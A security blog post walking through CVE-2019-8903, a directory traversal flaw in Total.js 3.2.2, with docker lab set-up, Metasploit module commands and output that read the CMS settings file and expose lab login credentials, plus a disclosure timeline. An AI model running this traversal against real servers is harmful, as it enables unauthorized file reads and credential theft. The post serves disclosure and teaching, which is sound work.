---
layout: default
---

# Total.js Directory Traversal: try this at home

[Total.js](https://www.totaljs.com) is a framework for Node.js platform written in pure JavaScript similar to PHP's Laravel or Python's Django or ASP.NET MVC. It can be used as web, desktop, service or IoT application.

Affected versions of this framework are vulnerable to Directory Traversal. This attack, also known as Path Traversal, aims to access files and directories that are stored outside the intended folder.

In order to try to exploit the vulnerability we need a running application on top of Total.js. The easy way is to use the [Total.js CMS](https://github.com/totaljs/cms) offered by Total.js developers.

In the following example we can see:
* how to set-up the testing lab with the latest Total.js CMS on top of a vulnerable version of Total.js
* how to use the Metasploit module for exploit the Directory Traversal vulnerability in order to read the CMS users credentials

Let's go!

## Lab set-up
The most fashion and easy way to set-up a vulnerable test host is [docker](https://www.docker.com). With the following steps we can create and run a vulnerable Total.js docker image.

Create a directory where store image source.

```
root@kali:~# mkdir totaljs
```

cd into the new directory and clone the [Total.js CMS](https://github.com/totaljs/cms) from GitHub, version 12.0.0 at the time of writing.

```
root@kali:~# cd totaljs && git clone https://github.com/totaljs/cms.git
```
In order to have at least one user in our CMS, replace the content of `cms/databases/settings.json` with this:
 
 ```
 {"componentator":false,"smtpoptions":"","smtp":"","languages":[],"signals":[],"users":[{"id":"f92trzhgdkvu1mt","name":"Fabio Cogno","login":"fabio.cogno","password":"certimetergroup","roles":["Dashboard","Events","Newsletters","Notices","Pages","Posts","Settings","Subscribers","Widgets"]}],"navigations":[{"id":"mainmenu","name":"Main menu"}],"notices":[{"id":"tweet","name":"Tweet"}],"posts":[{"id":"blog","name":"Blog"}],"templatesnewsletters":[{"id":"newsletter","name":"Default"}],"templatesposts":[{"id":"post","name":"Default"}],"templates":[{"id":"default","name":"Default"},{"id":"navigation","name":"With navigation"},{"id":"fluid","name":"Fluid"}],"url":"http://127.0.0.1:8000","emailsender":"info@totaljs.com","emailreply":"info@totaljs.com","emailcontactform":"info@totaljs.com"}
 ```
Then, in the totaljs directory, create the `dockerfile` and open it with your favorite editor (e.g.: `nano dockerfile`). This file allow us to create an image from a node v8 image, install a vulnerable version of Total.js framework from NPM and than copy the Total.js CMS in it:

```
FROM node:8
WORKDIR /home/node/totaljs
COPY cms/package*.json ./
RUN npm install
COPY cms/ .
RUN npm install total.js@3.2.2
EXPOSE 8000
CMD ["node","debug.js"]
```
Ok, now build the Total.js vulnerable image:

```
root@kali:~/totaljs# docker build -t totaljs:3.2.2 .
```
When the build process finished, run a container with the `totaljs:3.2.2` image and bind the default port of Total.js (8000) with the host's 8322 port:

```
root@kali:~/totaljs# docker run -p 8322:8000 totaljs:3.2.2 --name totaljs-3.2.2
```

If everything has been successful, browse to [http://localhost:8322/](http://localhost:8322/). 

To access to the admin panel, browse to [http://localhost:8322/admin/](http://localhost:8322/admin/).

## Exploiting the vuln!

In order to exploit the vulnerability, setting up the metasploit module as indicated in the [README.md](github.com/fabiocogno/metasploit-modules/README.md) file.

Start Metasploit console:

```
root@kali:~# msfconsole
```
When started, select the `totaljs_traversal` module:

```
msf5 auxiliary(scanner/http/totaljs_traversal) > use auxiliary/scanner/http/totaljs_traversal
```
Now, we would verify if the host is vulnerable to the Directory Traversal.

The default *ACTION* for this module is the `CHECK` action that reveale if the host:port is vulnerable to Directory Traversal. Furthermore, this action gather some other useful informations like the framework version, the running application name, the running application version, etc.

In order to check our host in the lab, set the target host and port:

```
msf5 auxiliary(scanner/http/totaljs_traversal) > set rhost localhost
rhost => localhost
msf5 auxiliary(scanner/http/totaljs_traversal) > set rport 8322
rport => 8322
```
Now, `run` the check action:
```
msf5 auxiliary(scanner/http/totaljs_traversal) > run
```
The output look like this one:

```
[*] Total.js version is: ^3.2.2
[*] App name: CMS
[*] App description: A simple and powerful CMS solution written in Total.js / Node.js.
[*] App version: 12.0.0
[*] Auxiliary module execution completed
```
Ok, our Total.js testing container is vulnerable, the framework version is, strangely, 3.2.2. and the running application is the Total.js CMS at version 12.0.0.

As promised, we exploit the Directory Traversal vulnerability in order to leak the users credentials of the Total.js CMS. To do this, we can use the `READ` action that allow to read files from the Metasploit console (alternatively you can use the `DOWNLOAD` action to dowload the file). The Total.js CMS store the users credentials into the *settings.json* file in the *databases/* directory. Then, set the action:

```
msf5 auxiliary(scanner/http/totaljs_traversal) > set action READ
action => READ
```
And then set-up the `databases/settings.json` file and try to retrieve it from the CMS:

```
msf5 auxiliary(scanner/http/totaljs_traversal) > set FILE databases/settings.json
FILE => databases/settings.json
msf5 auxiliary(scanner/http/totaljs_traversal) > run
```

The module exploit the vulnerability and retrieve the file. The output of the module is shown below:

```
[*] Getting databases/settings.json...
{"componentator":false,"smtpoptions":"","smtp":"","languages":[],"signals":[],"users":[{"id":"f92trzhgdkvu1mt","name":"Fabio Cogno","login":"fabio.cogno","password":"certimetergroup","roles":["Dashboard","Events","Newsletters","Notices","Pages","Posts","Settings","Subscribers","Widgets"]}],"navigations":[{"id":"mainmenu","name":"Main menu"}],"notices":[{"id":"tweet","name":"Tweet"}],"posts":[{"id":"blog","name":"Blog"}],"templatesnewsletters":[{"id":"newsletter","name":"Default"}],"templatesposts":[{"id":"post","name":"Default"}],"templates":[{"id":"default","name":"Default"},{"id":"navigation","name":"With navigation"},{"id":"fluid","name":"Fluid"}],"url":"http://127.0.0.1:8000","emailsender":"info@totaljs.com","emailreply":"info@totaljs.com","emailcontactform":"info@totaljs.com"}
[*] Auxiliary module execution completed
```

You can observe some useful informations, especially the username `"login":"fabio.cogno"` and the clear-text password `"password":"certimetergroup"`. Now we can browse to [http://localhost:8322/admin/](http://localhost:8322/admin/) and try to login with the discovered credentials.

## Time Line

| Date | What |
| --- | --- |
| 2019/02/18 | Vulnerability reported to Total.js and snyk teams. |
| 2019/02/20 | snyk disclose the vulnerability. |
| 2019/02/24 | Metasploit module released. |

## Summary
This post details how a Directory Traversal in the Total.js framework lead to credentials leak in the Total.js CMS. The vulnerability remained uncovered in the Total.js core for over **3 years**. It became non-exploitable in versions **3.2.4**.

## References

* [https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-8903](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-8903)
* [https://blog.totaljs.com/blogs/news/20190213-a-critical-security-fix/](https://blog.totaljs.com/blogs/news/20190213-a-critical-security-fix/)
* [https://snyk.io/vuln/SNYK-JS-TOTALJS-173710](https://snyk.io/vuln/SNYK-JS-TOTALJS-173710)
* [https://www.npmjs.com/package/total.js](https://www.npmjs.com/package/total.js)
* [https://github.com/totaljs/framework](https://github.com/totaljs/framework)

## Thanks

We would like to thank the volunteers of the snyk and Total.js teams which have been very friendly and acted professionally when working with us on this issue.

Special thanks to Riccardo Krauter for the discovery and Fabio Cogno for the Metasploit module development.

---

[back](./)